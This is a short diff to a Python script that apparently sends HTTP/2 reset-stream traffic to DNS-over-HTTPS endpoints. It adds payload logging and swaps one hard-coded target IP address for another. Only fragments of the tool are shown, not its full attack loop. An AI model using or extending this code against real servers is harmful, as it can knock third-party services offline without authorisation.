@@ -17,7 +17,7 @@ from h2.connection import H2Connection
 from h2.config import H2Configuration
 import h2.events
 import httpx
-import requests
+from logger_DoE import *
 import asyncio
 import warnings
 
@@ -115,6 +115,9 @@ def send_rst_stream_h2(host, sid,port=443, uri_path='/dns-query', timeout=5, pro
         #print(headers)
         h2_conn.send_headers(stream_id, headers)
         conn.send(h2_conn.data_to_send())
+        if stream_id==sid * 999999:
+            logger.log_info(LogLevel.PAYLOAD, f"处理的有效负载信息：{headers}")
+
         # h2_conn.send_data(stream_id, body)
         # conn.send(h2_conn.data_to_send())
         h2_conn.end_stream(stream_id)
@@ -140,13 +143,14 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument('-s', '--sid',default=1)
     args = parser.parse_args()
+    logger = InfoLogger(interval=1)
 
-    targets = ["8.218.236.77"]
+    targets = ["47.76.239.205"]
     #targets = ['108.61.195.177']
     for i in targets:
 
         now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        print(now,f"Checking {i}...", file=sys.stderr)
+        #print(now,f"Checking {i}...", file=sys.stderr)
         send_rst_stream_h2(i,int(args.sid))
         #print("send rst stream:", resp, err2)
 
